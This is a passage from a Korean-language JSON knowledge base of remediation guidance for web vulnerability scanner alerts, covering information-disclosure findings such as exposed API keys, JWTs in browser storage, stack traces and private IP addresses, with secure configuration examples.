    "example_aws_s3_bucket_policy": "# AWS S3 버킷 정책 예시 (공개 접근 차단)\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"PublicReadGetObject\",\n            \"Effect\": \"Deny\",\n            \"Principal\": \"*\",\n            \"Action\": \"s3:GetObject\",\n            \"Resource\": \"arn:aws:s3:::your-bucket-name/*\",\n            \"Condition\": {\n                \"StringEquals\": {\n                    \"aws:SourceVpce\": \"vpce-XXXXXXX\" # VPC Endpoint를 통한 접근만 허용하는 경우\n                },\n                \"NotIpAddress\": {\n                    \"aws:SourceIp\": \"192.0.2.0/24\" # 특정 IP 외에는 접근 거부\n                }\n            }\n        }\n    ]\n}",
    "example_aws_s3_block_public_access": "# AWS S3 'Block Public Access' 설정 (콘솔 또는 CLI에서 설정)\n# - BlockPublicAcls\n# - IgnorePublicAcls\n# - BlockPublicPolicy\n# - RestrictPublicBuckets\n# 이 네 가지를 모두 'True'로 설정하여 모든 형태의 공개 접근을 차단합니다."
  },
  "Information Disclosure - Base64-encoded String": {
    "translated": "정보 노출 - Base64 인코딩된 문자열 – Base64로 인코딩된 문자열 안에 민감 정보가 포함될 수 있음",
    "description": "웹 페이지 응답이나 네트워크 통신에서 Base64로 인코딩된 문자열이 발견될 때 발생하는 정보성 알림입니다. Base64 인코딩은 암호화가 아니므로, 인코딩된 문자열을 쉽게 디코딩하여 민감한 정보(예: 사용자 이름, 비밀번호, API 키, 내부 데이터)가 유출될 수 있습니다.",
    "solution_guidelines": [
      "**Base64 인코딩에 민감 정보 포함 금지:** 민감한 정보는 절대로 단순히 Base64로 인코딩하여 전송하거나 저장해서는 안 됩니다. Base64는 데이터 전송 형식일 뿐 암호화 메커니즘이 아닙니다.",
      "**민감 정보는 암호화 또는 안전한 채널로 전송:** 민감한 정보는 반드시 강력한 암호화 알고리즘(예: AES)으로 암호화하거나, HTTPS와 같은 안전한 채널을 통해 전송해야 합니다.",
      "**클라이언트 측 암호화/인코딩 재고:** 클라이언트 측에서 Base64 인코딩을 사용하여 민감 정보를 전송하는 경우, 이는 보안상 취약하므로 서버 측에서 직접 암호화된 채널을 통해 정보를 받거나, 서버 측에서만 처리하도록 로직을 변경합니다.",
      "**로그 및 캐시 검토:** Base64 인코딩된 민감 정보가 로그 파일, 브라우저 캐시, 프록시 서버 등에 저장되지 않도록 주의합니다."
    ],
    "example_general_data_handling": "# 민감 정보 처리 가이드라인\n# 1. Base64는 암호화가 아님을 인지\n# 2. 민감 정보는 암호화(AES 등) 후 전송하거나, HTTPS/WSS 같은 안전한 채널 사용\n# 3. 클라이언트 측에서 민감 정보에 대한 Base64 인코딩 지양\n# 4. 로그, 캐시 등에서 민감 정보 노출 방지"
  },
  "Information Disclosure - Credit Card Number": {
    "translated": "정보 노출 - 신용카드 번호 – 웹 페이지나 통신에 신용카드 번호가 평문으로 노출됨",
    "description": "웹 페이지, 네트워크 트래픽, 로그 파일, 데이터베이스 등에서 신용카드 번호가 노출되는 심각한 취약점입니다. 이는 금융 정보 탈취 및 사기로 이어질 수 있어 PCI DSS와 같은 규정 준수에도 위배됩니다.",
    "solution_guidelines": [
      "**신용카드 정보 저장 금지 또는 토큰화:** 웹 애플리케이션 자체에 신용카드 번호를 저장하는 것을 원칙적으로 금지합니다. 불가피하게 저장해야 한다면, PCI DSS 규정을 준수하는 안전한 방식으로 토큰화(Tokenization)하거나 암호화된 형태로 저장합니다.",
      "**PCI DSS 준수:** 신용카드 정보를 처리하는 모든 시스템과 프로세스는 PCI DSS(Payment Card Industry Data Security Standard) 규정을 철저히 준수해야 합니다.",
      "**Payment Gateway (PG) 연동:** 신용카드 결제는 직접 처리하지 않고, 검증된 외부 결제 게이트웨이(PG)를 통해 처리하도록 하여 신용카드 정보가 애플리케이션 서버를 통과하거나 저장되지 않도록 합니다.",
      "**HTTPS (TLS) 강제 적용:** 모든 결제 관련 통신은 반드시 HTTPS(TLS)를 통해 암호화되어야 합니다.",
      "**로그 및 캐시에서 제거:** 신용카드 번호가 로그 파일, 브라우저 캐시, 프록시 서버, 에러 메시지 등에 절대 기록되거나 노출되지 않도록 합니다."
    ],
    "example_general_payment_processing": "# 신용카드 정보 처리 보안 가이드라인\n# 1. 신용카드 번호 직접 저장 금지 (토큰화 또는 PG 연동)\n# 2. PCI DSS 규정 철저 준수\n# 3. 검증된 Payment Gateway (PG) 사용\n# 4. 모든 결제 통신에 HTTPS/TLS 강제 적용\n# 5. 로그, 캐시 등에서 신용카드 번호 노출 방지"
  },
  "Information Disclosure - Debug Error Messages": {
    "translated": "정보 노출 - 디버그 오류 메시지 – 상세한 디버그 오류 메시지가 사용자에게 노출되어 시스템 정보가 유출될 수 있음",
    "description": "운영 환경의 웹 애플리케이션이 디버그 목적으로 사용되는 상세한 오류 메시지(예: 스택 트레이스, 데이터베이스 쿼리, 파일 경로, 서버 내부 변수 등)를 사용자에게 직접 노출하는 취약점입니다. 이는 공격자가 시스템 내부 구조를 파악하고 다음 공격을 계획하는 데 활용될 수 있습니다.",
    "solution_guidelines": [
      "**운영 환경에서 상세 오류 메시지 비활성화:** 개발/디버그 환경에서만 상세한 오류 메시지를 활성화하고, 운영 환경에서는 일반적인 오류 페이지나 간단한 메시지만 사용자에게 보여주도록 설정합니다.",
      "**에러 로깅 시스템 사용:** 모든 오류는 서버 측에서 안전하게 로깅하고, 로깅된 정보는 관리자만 접근할 수 있도록 합니다. 로그 파일은 웹을 통해 접근 불가능한 위치에 저장합니다.",
      "**커스텀 에러 페이지 설정:** 웹 서버와 애플리케이션 프레임워크 모두에서 사용자에게 보여질 커스텀 에러 페이지를 설정하여, 상세 오류 정보가 노출되지 않도록 합니다.",
      "**민감한 정보 제거:** 오류 메시지에 데이터베이스 연결 문자열, API 키, 개인 식별 정보(PII) 등 민감한 정보가 포함되지 않도록 합니다."
    ],
    "example_spring_boot_error_handling": "# Spring Boot application.properties 예시 (에러 메시지 상세도 조절)\nserver.error.include-exception=false\nserver.error.include-stacktrace=never\nserver.error.whitelabel.enabled=false # 기본 화이트라벨 에러 페이지 비활성화\n\n# 커스텀 에러 페이지 설정 (예시)\n# @ControllerAdvice\n# public class CustomErrorController implements ErrorController {\n#\n#     @RequestMapping(\"/error\")\n#     public String handleError(HttpServletRequest request) {\n#         // HTTP 상태 코드에 따라 다른 페이지를 보여줄 수 있음\n#         Object status = request.getAttribute(RequestDispatcher.ERROR_STATUS_CODE);\n#         if (status != null) {\n#             Integer statusCode = Integer.valueOf(status.toString());\n#             if (statusCode == HttpStatus.NOT_FOUND.value()) {\n#                 return \"error-404\";\n#             } else if (statusCode == HttpStatus.INTERNAL_SERVER_ERROR.value()) {\n#                 return \"error-500\";\n#             }\n#         }\n#         return \"error\"; // 기본 에러 페이지\n#     }\n# }"
  },
  "Information Disclosure - Debug Error Messages via WebSocket": {
    "translated": "정보 노출 - 웹소켓을 통한 디버그 오류 메시지 – 웹소켓 통신 중 상세 디버그 오류 메시지가 유출될 수 있음",
    "description": "WebSocket 메시지를 통해 디버그 목적으로 사용되는 상세한 오류 메시지(예: 스택 트레이스, 데이터베이스 오류, 내부 경로)가 노출되는 취약점입니다. 이는 웹 소켓 통신을 가로채거나 모니터링하는 공격자에게 시스템 내부 정보를 제공할 수 있습니다.",
    "solution_guidelines": [
      "**WebSocket 통신에 HTTPS(WSS) 사용:** 모든 WebSocket 통신은 반드시 `wss://` 프로토콜을 사용하여 암호화된 채널을 통해 이루어져야 합니다.",
      "**운영 환경에서 상세 오류 메시지 WebSocket 전송 금지:** 개발/디버그 환경에서만 상세 오류 메시지를 WebSocket으로 전송하고, 운영 환경에서는 일반적이고 간결한 오류 코드 또는 메시지만 클라이언트에 전송하도록 합니다.",
      "**에러 로깅 시스템 사용:** WebSocket에서 발생하는 모든 오류는 서버 측에서 안전하게 로깅하고, 로깅된 정보는 관리자만 접근할 수 있도록 합니다.",
      "**민감한 정보 제거:** WebSocket 오류 메시지에 데이터베이스 연결 문자열, API 키, 개인 식별 정보(PII) 등 민감한 정보가 포함되지 않도록 합니다."
    ],
    "example_nodejs_websocket_error_handling": "// Node.js WebSocket 서버 예시 (에러 메시지 처리)\nconst WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', ws => {\n  ws.on('message', message => {\n    try {\n      // 메시지 처리 로직\n      // ...\n    } catch (error) {\n      console.error(\"WebSocket error:\", error); // 서버 측 로그\n      if (process.env.NODE_ENV === 'production') {\n        ws.send(JSON.stringify({\n          type: 'error',\n          message: 'An internal server error occurred.' // 일반적인 메시지 전송\n        }));\n      } else {\n        ws.send(JSON.stringify({\n          type: 'error',\n          message: error.message, // 개발 환경에서는 상세 메시지\n          stack: error.stack      // 개발 환경에서는 스택 트레이스\n        }));\n      }\n    }\n  });\n});"
  },
  "Information Disclosure - Email Addresses": {
    "translated": "정보 노출 - 이메일 주소 – 웹 페이지나 통신에 이메일 주소가 노출됨",
    "description": "웹 페이지 콘텐츠, HTTP 응답 헤더, JavaScript 파일, 주석, 로그 파일 등에서 사용자나 관리자의 이메일 주소가 불필요하게 노출되는 취약점입니다. 이는 스팸, 피싱 공격, 또는 개인 식별 정보(PII) 유출로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**이메일 주소 직접 노출 최소화:** 웹 페이지, 게시판, 댓글 등 공개적으로 접근 가능한 곳에 이메일 주소를 직접 노출하는 것을 최소화합니다. 필요하다면 CAPTCHA가 적용된 문의 폼이나 서버 측에서 처리하는 메일 전송 기능을 사용합니다.",
      "**HTML 주석 및 스크립트 검토:** HTML 주석, JavaScript 코드 내에 이메일 주소가 하드코딩되어 있지 않은지 확인하고 제거합니다.",
      "**오류 메시지 및 로그 검토:** 오류 메시지나 서버 로그에 이메일 주소가 기록되어 외부에 노출되지 않도록 설정합니다.",
      "**SPAM 봇 방지 기법 적용:** 이메일 주소를 이미지로 제공하거나, JavaScript를 사용하여 `@`를 동적으로 삽입하는 등 SPAM 봇이 이메일 주소를 수집하기 어렵게 만드는 기법을 적용합니다."
    ],
    "example_html_email_obfuscation": "<script type=\"text/javascript\">\n  document.write('E-mail: <a href=\"mailto:info' + '@' + 'example.com\">info@example.com</a>');\n</script>"
  },
  "Information Disclosure - Google API Key": {
    "translated": "정보 노출 - Google API 키 – Google API 키가 웹 페이지에 노출되어 악용될 수 있음",
    "description": "Google API 키가 웹 페이지 소스 코드, JavaScript 파일, 또는 기타 클라이언트 측 리소스에 하드코딩되어 노출되는 취약점입니다. API 키가 노출되면 공격자가 이를 사용하여 할당량을 소진시키거나, 비용을 발생시키거나, 심지어 특정 Google 서비스에 대한 무단 접근을 시도할 수 있습니다.",
    "solution_guidelines": [
      "**API 키 제한 설정:** Google API 콘솔에서 API 키에 대한 제한(Restrictions)을 설정합니다. HTTP 리퍼러 제한(웹 사이트), IP 주소 제한(서버), Android/iOS 앱 제한 등을 사용하여 해당 API 키가 특정 환경에서만 사용되도록 합니다.",
      "**클라이언트 측 API 키 사용 재고:** 서버 측에서만 호출되어야 하는 API 키는 절대로 클라이언트 측 코드에 포함하지 않습니다. 클라이언트 측에서 필요한 API (예: Google Maps JavaScript API)만 클라이언트 측에 노출하고, 이 경우에도 엄격한 제한을 설정합니다.",
      "**환경 변수 또는 보안 저장소 사용:** 서버 측에서 API 키를 사용할 때는 환경 변수(Environment Variable)나 AWS Secrets Manager, Azure Key Vault와 같은 보안 저장소에서 로드하도록 합니다.",
      "**API 키 순환(Rotation):** 노출된 API 키는 즉시 무효화하고 새로운 키를 생성하여 적용합니다.",
      "**불필요한 API 키 제거:** 사용하지 않는 API 키는 삭제합니다."
    ],
    "example_javascript_api_key_restriction": "<script async defer\n  src=\"https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap\">\n</script>"
  },
  "Information Disclosure - HTML Comments": {
    "translated": "정보 노출 - HTML 주석 – HTML 주석 안에 민감한 정보(개발자 코멘트 등)가 포함됨",
    "description": "HTML 주석() 내에 민감한 정보(예: 개발자 노트, 내부 시스템 경로, 비밀번호 힌트, SQL 쿼리, 미완성 기능에 대한 설명 등)가 포함되어 외부에 노출되는 취약점입니다.",
    "solution_guidelines": [
      "**모든 HTML 주석 검토 및 제거:** 운영 환경에 배포하기 전에 모든 HTML 주석을 검토하여 민감한 정보가 포함되어 있지 않은지 확인하고, 불필요한 주석은 제거합니다.",
      "**서버 측 주석 활용:** 민감한 정보나 개발자 노트는 클라이언트에게 노출되지 않는 서버 측 스크립트(예: JSP, PHP, ASP.NET)의 주석으로만 사용합니다.",
      "**클라이언트 측 정보 최소화:** 웹 페이지에 필요한 최소한의 정보만 포함하고, 내부 시스템에 대한 어떠한 힌트도 제공하지 않도록 합니다.",
      "**자동화된 주석 제거 도구 사용:** 빌드 프로세스에서 HTML 주석을 자동으로 제거하는 도구(예: HTML Minifier)를 사용하는 것을 고려합니다."
    ],
    "example_html_comment_secure": "-->\n\n<?php\n    // PHP 주석: DB 연결 로직 검토 필요\n    // $db_password = \"very_secret_password\"; // 절대 이렇게 하지 마세요!\n?>"
  },
  "Information Disclosure - Hash": {
    "translated": "정보 노출 - 해시 – 비밀번호 해시 값 등 보안에 중요한 해시 값이 노출됨",
    "description": "비밀번호, API 키, 토큰 등 민감한 정보의 해시 값이 웹 페이지, HTTP 응답 헤더, URL 파라미터, 로그 파일 등에 노출되는 취약점입니다. 노출된 해시 값이 안전하지 않은 알고리즘(MD5, SHA1 등)으로 생성되었거나, 솔트(salt)가 사용되지 않았다면 공격자가 쉽게 역추적하거나 무지개 테이블 공격에 사용할 수 있습니다.",
    "solution_guidelines": [
      "**안전한 해싱 알고리즘 사용:** 비밀번호와 같은 민감 정보의 해싱에는 PBKDF2, bcrypt, scrypt, Argon2와 같이 솔트와 높은 반복 횟수를 지원하는 강력한 단방향 해싱 알고리즘을 사용합니다.",
      "**솔트(Salt) 사용:** 각 사용자마다 고유한 솔트를 생성하여 해시 충돌 공격 및 무지개 테이블 공격을 방지합니다.",
      "**해싱된 정보 노출 금지:** 해싱된 비밀번호나 기타 민감한 정보는 어떠한 형태로든 웹에 노출되지 않도록 합니다. 이는 클라이언트 측 코드, HTTP 응답, 로그 파일 등 모든 곳에 해당됩니다.",
      "**해싱 용도 재평가:** MD5, SHA1과 같이 약한 알고리즘이 사용되는 경우, SHA-256 이상으로 전환하는 것을 권장합니다. (파일 무결성 검사 목적이라도)"
    ],
    "example_python_secure_hashing": "# Python 해싱 예시 (bcrypt 사용, 정보 노출 방지)\nimport bcrypt\n\ndef hash_data(data):\n    # 민감한 데이터는 절대 해싱된 형태로 노출하지 않음\n    # (예: 비밀번호는 서버 측에서만 해싱/검증)\n    return bcrypt.hashpw(data.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')\n\n# 웹 응답, 로그 등에 이 해시 값을 직접 노출하지 않아야 함\n# password_hash = hash_data(\"user_sensitive_password\")\n# print(password_hash) # 이 값을 클라이언트에 직접 보내지 마세요"
  },
  "Information Disclosure - IBAN Numbers": {
    "translated": "정보 노출 - IBAN 번호 – 국제 은행 계좌 번호(IBAN)가 노출됨",
    "description": "IBAN(International Bank Account Number)과 같은 은행 계좌 정보가 웹 페이지, HTTP 응답, 파일 다운로드 등에서 노출되는 취약점입니다. 이는 금융 사기 또는 개인 정보 침해로 이어질 수 있는 심각한 정보 유출입니다.",
    "solution_guidelines": [
      "**IBAN 정보 직접 노출 금지:** IBAN을 포함한 금융 계좌 정보는 사용자에게 직접 노출하는 것을 최소화합니다. 필요하다면 일부만 마스킹 처리하여 보여주고, 전체 정보는 안전한 환경(예: 인증된 사용자만 접근 가능한 관리 페이지, 암호화된 데이터베이스)에서만 제공합니다.",
      "**민감 정보는 암호화 또는 토큰화:** 금융 정보는 데이터베이스에 저장 시 강력한 암호화 알고리즘으로 암호화하거나, PG사에서 제공하는 토큰화 서비스를 활용하여 직접 저장하지 않습니다.",
      "**HTTPS (TLS) 강제 적용:** 모든 금융 관련 정보 통신은 반드시 HTTPS(TLS)를 통해 암호화되어야 합니다.",
      "**로그 및 캐시에서 제거:** IBAN과 같은 금융 정보가 로그 파일, 브라우저 캐시, 프록시 서버, 에러 메시지 등에 절대 기록되거나 노출되지 않도록 합니다.",
      "**접근 제어 강화:** 금융 정보를 포함하는 모든 페이지나 API 엔드포인트에 대해 강력한 인증 및 권한 부여 로직을 적용합니다."
    ],
    "example_general_data_masking": "# IBAN 등 금융 정보 마스킹 예시 (Python)\ndef mask_iban(iban):\n    if len(iban) < 4:\n        return iban\n    return 'X' * (len(iban) - 4) + iban[-4:]\n\n# masked_iban = mask_iban(\"DE89370400440532013000\") # Output: XXXXXXXXXXXXXXXX3000"
  },
  "Information Disclosure - IP Exposed via F5 BIG-IP Persistence Cookie": {
    "translated": "정보 노출 - F5 BIG-IP 지속성 쿠키를 통한 IP 노출 – F5 BIG-IP 쿠키를 통해 백엔드 서버의 실제 IP 주소가 노출됨",
    "description": "F5 BIG-IP 로드 밸런서가 사용하는 'Persistence Cookie'(예: `BIGipServer~...` 형태)가 내부 서버의 IP 주소를 Base64 등으로 인코딩하여 포함하는 경우가 있습니다. 이 쿠키가 노출되면 공격자가 내부 네트워크의 IP 주소를 파악할 수 있어 네트워크 구조 인지 및 특정 서버 직접 공격 시도에 활용될 수 있습니다.",
    "solution_guidelines": [
      "**F5 BIG-IP 설정 변경:** F5 BIG-IP의 Persistence Profile 설정을 변경하여 쿠키에 실제 서버 IP 주소를 포함하지 않도록 합니다. 대신, 세션 ID 또는 기타 무작위 값을 사용하여 Persistence를 유지하도록 구성합니다.",
      "**Secure Cookie 사용:** BIG-IP가 생성하는 모든 쿠키에 'Secure' 플래그를 설정하여 HTTPS 환경에서만 전송되도록 합니다.",
      "**HttpOnly Cookie 사용:** BIG-IP가 생성하는 쿠키에 'HttpOnly' 플래그를 설정하여 클라이언트 측 스크립트에서 쿠키에 접근할 수 없도록 합니다.",
      "**내부 IP 주소 노출 방지:** 웹 서버, 애플리케이션 서버, 로드 밸런서 등 모든 레이어에서 HTTP 응답 헤더, 에러 메시지, 로그 등에 내부 IP 주소가 노출되지 않도록 합니다."
    ],
    "example_f5_bigip_guideline": "\n# F5 BIG-IP Persistence Cookie 보안 가이드라인\n# 1. Persistence Profile 설정에서 IP 주소 기반 쿠키 사용 지양\n# 2. 대신 Session ID 기반 또는 암호화된 쿠키 사용 고려\n# 3. 모든 BIG-IP 쿠키에 Secure 및 HttpOnly 플래그 적용\n# 4. 내부 IP 주소 노출 방지 위한 전반적인 보안 강화\n    "
  },
  "Information Disclosure - Information in Browser Storage": {
    "translated": "정보 노출 - 브라우저 저장소 내 정보 – 브라우저의 localStorage/sessionStorage에 민감한 정보가 저장되어 노출됨",
    "description": "웹 애플리케이션이 브라우저의 Local Storage, Session Storage, IndexedDB 등에 민감한 정보(예: 개인 식별 정보, 세션 토큰, 사용자 설정 등)를 저장하여, XSS (Cross-Site Scripting) 공격이나 기타 클라이언트 측 공격에 의해 해당 정보가 탈취될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**브라우저 저장소에 민감 정보 저장 금지:** 개인 식별 정보(PII), 인증 토큰(특히 JWT), 세션 ID 등 민감한 정보는 Local Storage나 Session Storage에 직접 저장하지 않습니다.",
      "**HttpOnly 쿠키 사용:** 세션 ID나 인증 토큰 등 서버로 전송되어야 하는 민감한 정보는 `HttpOnly` 플래그가 설정된 쿠키에 저장하여 JavaScript를 통한 접근을 차단합니다.",
      "**데이터 암호화 또는 토큰화:** 불가피하게 클라이언트 측 저장소에 데이터를 저장해야 한다면, 저장하기 전에 강력한 암호화 알고리즘으로 암호화하거나, 토큰화된 형태로 저장합니다.",
      "**XSS 방어 철저:** 브라우저 저장소의 정보 탈취는 종종 XSS 공격을 통해 이루어지므로, 애플리케이션의 모든 XSS 취약점을 철저히 방어합니다.",
      "**저장 데이터 최소화:** 클라이언트 측 저장소에 저장되는 데이터의 양을 최소화하고, 필요한 정보만 저장하도록 합니다."
    ],
    "example_javascript_browser_storage_secure": "\n// Insecure (vulnerable: storing token directly in localStorage)\n// localStorage.setItem('auth_token', 'your_jwt_token');\n\n// Secure (preferring HttpOnly cookie for auth tokens)\n// 서버 측에서 HttpOnly 쿠키 설정:\n// Set-Cookie: auth_token=your_jwt_token; HttpOnly; Secure; SameSite=Lax; Path=/\n\n// 일반적인 데이터 저장 시 (민감하지 않은 정보)\nlocalStorage.setItem('user_preference', 'dark_theme');\n    "
  },
  "Information Disclosure - Information in Browser localStorage": {
    "translated": "정보 노출 - 브라우저 localStorage 내 정보 – 브라우저 localStorage에 민감한 정보가 저장되어 노출됨",
    "description": "브라우저의 Local Storage에 민감한 정보(예: 개인 식별 정보, 세션 토큰, 사용자 설정 등)가 저장되어, XSS (Cross-Site Scripting) 공격이나 기타 클라이언트 측 공격에 의해 해당 정보가 탈취될 수 있는 취약점입니다. Local Storage는 세션 종료 후에도 데이터가 유지됩니다.",
    "solution_guidelines": [
      "**Information Disclosure - Information in Browser Storage** 취약점의 해결 가이드라인을 참조하십시오.",
      "특히 Local Storage는 영구적으로 저장되므로, 세션 스토리지보다 더욱 민감한 정보 저장을 피해야 합니다."
    ]
  },
  "Information Disclosure - Information in Browser sessionStorage": {
    "translated": "정보 노출 - 브라우저 sessionStorage 내 정보 – 브라우저 sessionStorage에 민감한 정보가 저장되어 노출됨",
    "description": "브라우저의 Session Storage에 민감한 정보(예: 개인 식별 정보, 세션 토큰, 사용자 설정 등)가 저장되어, XSS (Cross-Site Scripting) 공격이나 기타 클라이언트 측 공격에 의해 해당 정보가 탈취될 수 있는 취약점입니다. Session Storage는 브라우저 탭/창이 닫히면 데이터가 사라집니다.",
    "solution_guidelines": [
      "**Information Disclosure - Information in Browser Storage** 취약점의 해결 가이드라인을 참조하십시오.",
      "Session Storage는 Local Storage보다는 덜 위험하지만, 여전히 XSS 공격에 취약하므로 민감한 정보 저장은 피해야 합니다."
    ]
  },
  "Information Disclosure - JWT in Browser Storage": {
    "translated": "정보 노출 - JWT (브라우저 저장소 내) – JWT(JSON Web Token)가 브라우저 저장소에 민감하게 저장되어 노출됨",
    "description": "JWT(JSON Web Token)가 브라우저의 Local Storage나 Session Storage에 저장되어, XSS (Cross-Site Scripting) 공격에 의해 토큰이 탈취될 수 있는 취약점입니다. 탈취된 JWT는 공격자가 사용자를 사칭하여 요청을 보낼 수 있게 합니다.",
    "solution_guidelines": [
      "**JWT를 HttpOnly 쿠키에 저장:** JWT는 브라우저의 Local Storage나 Session Storage 대신, `HttpOnly` 플래그가 설정된 쿠키에 저장하는 것이 권장됩니다. `HttpOnly` 쿠키는 JavaScript를 통해 접근할 수 없으므로 XSS 공격으로부터 안전합니다.",
      "**'Secure' 플래그 사용:** `HttpOnly` 쿠키와 함께 'Secure' 플래그를 설정하여 HTTPS 환경에서만 쿠키가 전송되도록 합니다.",
      "**JWT 짧은 만료 시간 설정:** JWT의 만료 시간을 짧게 설정하여 토큰이 탈취되더라도 공격자가 사용할 수 있는 시간을 최소화합니다.",
      "**Refresh Token 활용:** 장기간 사용될 필요가 있는 경우, 짧은 유효 기간의 Access Token과 함께 `HttpOnly` 쿠키에 저장된 장기간 유효한 Refresh Token을 사용하여 Access Token을 갱신하는 방식을 고려합니다.",
      "**XSS 방어 철저:** JWT 탈취의 주된 원인은 XSS이므로, 애플리케이션의 모든 XSS 취약점을 철저히 방어합니다."
    ],
    "example_backend_jwt_cookie": "\n# 백엔드에서 JWT를 HttpOnly 쿠키로 설정하는 예시 (Node.js Express)\n// app.post('/login', (req, res) => {\n// \tconst token = generateJwtToken(user);\n// \tres.cookie('jwt', token, {\n// \t\thttpOnly: true, // JavaScript 접근 방지\n// \t\tsecure: process.env.NODE_ENV === 'production', // HTTPS에서만 전송\n// \t\tsameSite: 'Lax', // CSRF 방어\n// \t\tmaxAge: 3600000 // 1시간 (밀리초)\n// \t});\n// \tres.json({ message: 'Login successful' });\n// });\n    "
  },
  "Information Disclosure - JWT in Browser localStorage": {
    "translated": "정보 노출 - JWT (브라우저 localStorage 내) – JWT가 브라우저 localStorage에 민감하게 저장되어 노출됨",
    "description": "JWT(JSON Web Token)가 브라우저의 Local Storage에 저장되어 XSS (Cross-Site Scripting) 공격에 의해 토큰이 탈취될 수 있는 취약점입니다. Local Storage는 세션 종료 후에도 데이터가 유지되므로, 탈취된 토큰은 지속적으로 악용될 수 있습니다.",
    "solution_guidelines": [
      "**Information Disclosure - JWT in Browser Storage** 취약점의 해결 가이드라인을 참조하십시오.",
      "특히 Local Storage는 영구 저장소이므로 JWT 저장을 강력히 지양해야 합니다."
    ]
  },
  "Information Disclosure - JWT in Browser sessionStorage": {
    "translated": "정보 노출 - JWT (브라우저 sessionStorage 내) – JWT가 브라우저 sessionStorage에 민감하게 저장되어 노출됨",
    "description": "JWT(JSON Web Token)가 브라우저의 Session Storage에 저장되어 XSS (Cross-Site Scripting) 공격에 의해 토큰이 탈취될 수 있는 취약점입니다. Session Storage는 탭/창이 닫히면 데이터가 사라지지만, 세션 동안은 XSS 공격에 취약합니다.",
    "solution_guidelines": [
      "**Information Disclosure - JWT in Browser Storage** 취약점의 해결 가이드라인을 참조하십시오.",
      "Session Storage는 Local Storage보다는 덜 위험하지만, 여전히 JWT 저장을 피하고 HttpOnly 쿠키를 사용하는 것이 더 안전합니다."
    ]
  },
  "Information Disclosure - Java Stack Trace": {
    "translated": "정보 노출 - Java 스택 트레이스 – Java 애플리케이션의 상세한 오류 스택 트레이스가 노출되어 내부 구조 파악에 이용될 수 있음",
    "description": "Java 기반 웹 애플리케이션에서 발생한 오류의 상세한 스택 트레이스(Stack Trace)가 사용자에게 직접 노출되는 취약점입니다. 스택 트레이스는 파일 경로, 클래스 이름, 메서드 호출 순서 등 내부 시스템 구조에 대한 민감한 정보를 포함하여 공격자가 다음 공격을 계획하는 데 활용될 수 있습니다.",
    "solution_guidelines": [
      "**운영 환경에서 상세 오류 메시지 비활성화:** 개발/디버그 환경에서만 상세한 스택 트레이스를 활성화하고, 운영 환경에서는 일반적인 오류 페이지나 간결한 메시지만 사용자에게 보여주도록 설정합니다.",
      "**에러 로깅 시스템 사용:** 모든 오류는 서버 측에서 안전하게 로깅하고, 로깅된 정보는 관리자만 접근할 수 있도록 합니다. 로그 파일은 웹을 통해 접근 불가능한 위치에 저장합니다.",
      "**커스텀 에러 페이지 설정:** `web.xml` 또는 Spring, Servlet 등 프레임워크 설정을 통해 사용자에게 보여질 커스텀 에러 페이지를 설정하여, 상세 오류 정보가 노출되지 않도록 합니다.",
      "**필요한 정보만 로깅:** 스택 트레이스 자체를 로깅할 때는 개인 식별 정보(PII)나 민감한 구성 정보가 포함되지 않도록 주의합니다."
    ],
    "example_java_web_xml_error_page": "\n<error-page>\n \t<error-code>500</error-code>\n \t<location>/error/500.jsp</location>\n</error-page>\n<error-page>\n \t<exception-type>java.lang.Throwable</exception-type>\n \t<location>/error/generalError.jsp</location>\n</error-page>\n    ",
    "example_spring_boot_error_properties": "\n# Spring Boot application.properties\nserver.error.include-exception=false\nserver.error.include-stacktrace=never\n    "
  },
  "Information Disclosure - Private IP Address": {
    "translated": "정보 노출 - 사설 IP 주소 – 내부망에서만 사용되어야 할 사설 IP 주소가 웹에 노출됨",
    "description": "웹 페이지 콘텐츠, HTTP 응답 헤더, 에러 메시지, 리다이렉션 URL 등에서 내부(사설) IP 주소(예: 10.x.x.x, 172.16.x.x - 172.31.x.x, 192.168.x.x)가 노출되는 취약점입니다. 이는 공격자가 내부 네트워크 구조를 파악하고, SSRF(Server-Side Request Forgery) 공격 등에 활용될 수 있습니다.",
    "solution_guidelines": [
      "**모든 계층에서 사설 IP 노출 금지:** 웹 서버, 애플리케이션 서버, 로드 밸런서, CDN 등 모든 네트워크 및 애플리케이션 계층에서 HTTP 응답 헤더, HTML 콘텐츠, JavaScript, 오류 메시지, 로그 등에 사설 IP 주소가 노출되지 않도록 설정합니다.",
      "**프록시 설정 검토:** 리버스 프록시나 로드 밸런서 사용 시, 실제 서버의 IP 주소가 `X-Forwarded-For` 등의 헤더를 통해 내부 사용자에게 노출되지 않도록 설정합니다. (내부 로깅용으로는 사용 가능)",
      "**디버그 모드 비활성화:** 운영 환경에서는 디버그 모드를 비활성화하여 상세한 오류 메시지나 스택 트레이스 노출을 방지합니다.",
      "**에러 페이지 사용자 정의:** 상세 오류 페이지나 리다이렉션 URL에 사설 IP 주소가 포함되지 않도록 커스텀 에러 페이지를 사용합니다."
    ],
    "example_nginx_hide_ip": "\n# Nginx 설정 예시 (내부 IP 노출 방지)\n# proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n# 위 설정이 내부 IP를 포함할 수 있으므로, 외부로 나가는 응답에서는 제거\n# Header unset X-Forwarded-For; (Apache mod_headers)\n\n# 에러 페이지 경로 등에서 IP 직접 참조 대신 호스트명 사용\n# return 500 \"Internal Server Error\";\n    "
  },
  "Information Disclosure - SQL Error": {
    "translated": "정보 노출 - SQL 오류 – SQL 쿼리 오류 메시지가 사용자에게 노출되어 데이터베이스 구조 파악에 이용될 수 있음",
    "description": "웹 애플리케이션의 응답에 상세한 SQL 에러 메시지(예: 데이터베이스 드라이버 오류, SQL 구문 오류, 테이블/컬럼 이름 등)가 포함되어 노출되는 취약점입니다. 이는 공격자가 데이터베이스의 종류, 구조, 잠재적 SQL Injection 취약점 등을 파악하는 데 결정적인 힌트를 제공합니다.",
    "solution_guidelines": [
      "**운영 환경에서 상세 SQL 에러 메시지 비활성화:** 개발/디버그 환경에서만 상세한 SQL 에러를 표시하고, 운영 환경에서는 일반적인 오류 페이지나 '데이터베이스 처리 중 오류가 발생했습니다.'와 같은 간결한 메시지만 사용자에게 보여주도록 설정합니다.",
